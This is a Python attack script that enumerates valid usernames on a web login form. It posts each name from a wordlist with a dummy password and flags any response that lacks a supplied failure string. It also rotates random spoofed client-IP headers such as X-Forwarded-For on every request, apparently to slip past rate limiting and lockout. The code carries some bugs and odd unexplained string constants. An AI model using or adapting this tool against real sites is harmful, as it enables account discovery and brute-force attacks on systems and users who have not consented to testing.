import requests
from random import *
import argparse,re
from pwn import *



class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    ladrrr = '8GY.'
    ss = 'OWQ1'
    FAIL = '\033[91m' #RED
    pinocho_chocho = 'y!c'
    RESET = '\033[0m' #RESET COLOR



proxy = {
  'http': 'http://127.0.0.1:8080',
}

global op1
global op2
op1 = 1
op2 = 255

def load_words22(WORDLIST_FILENAME,url,text,userfield,passwdfield,proxy,headerss):
       p3 = log.progress("Enumerate Users via Different Text Responses...")
       global line
       try:
        stringer = headerss
        char = ":"
        indices = [i.start() for i in re.finditer(char, stringer)]
        if len(indices) == 1:
            indices1 = int(indices[0])
            first_p = headerss[:indices1]
            firs_v = headerss[indices1:]
            first_v = firs_v[1:]
        if len(indices) == 2:
            indices1 = int(indices[0])
            indices2 = int(indices[1])
            first_p = headerss[:indices1]
            firs_v = headerss[indices1:]
            stringer = firs_v
            charr = ","
            coma = [i.start() for i in re.finditer(charr, stringer)]
            first_v = firs_v[1:coma[0]]
            stringer = headerss
            charr = ","
            coma = [i.start() for i in re.finditer(charr, stringer)]
            second_p = headerss[coma[0]:indices2][1:]
            second_v = headerss[indices2:][1:]
       except: 
            KeyboardInterrupt()
       print("Starting Fuzzing Usernames...")
       print("Working...")
       wordlist = list()
       proxy = {
          'http': proxy,
        }
       with open(WORDLIST_FILENAME) as f:
            for line in f:
                wordlist.append(wordlist)
                my_str=line
                final_str=my_str[:-1]
                b = randint(op1, op2)
                c = randint(op1, op2)
                d = randint(op1, op2)
                e = randint(op1, op2)
                bb = str(b)
                cc = str(c)
                dd = str(d)
                ee = str(e)
                pp = {userfield: final_str,passwdfield: "penedurisimo"}
                dot = "."
                ip = bb+dot+cc+dot+dd+dot+ee
                ip2 = str(ip)
                if headerss == None:
                    headers = {
                    'X-Forwarded-For': ip2,
                    'X-Originating-IP': ip2,
                    'X-Remote-IP': ip2,
                    'X-Remote-Addr': ip2,
                    }
                else:
                    if len(indices) == 1:
                        headers = {
                        'X-Forwarded-For': ip2,
                        'X-Originating-IP': ip2,
                        'X-Remote-IP': ip2,
                        'X-Remote-Addr': ip2,
                        first_p: first_v
                        }
                    elif len(indices) == 2:
                        headers = {
                        'X-Forwarded-For': ip2,
                        'X-Originating-IP': ip2,
                        'X-Remote-IP': ip2,
                        'X-Remote-Addr': ip2,
                        first_p: first_v,
                        second_v: second_p
                        }

                
                resp = requests.post(url,data=pp,proxies=proxy,headers=headers)
                bbb = resp.status_code
                arr = resp.text
                aaaas = len(resp.content)
                if text in arr:
                    pass
                else:
                    print(f"{bcolors.OK}[+] Username Found{bcolors.RESET}",final_str) 




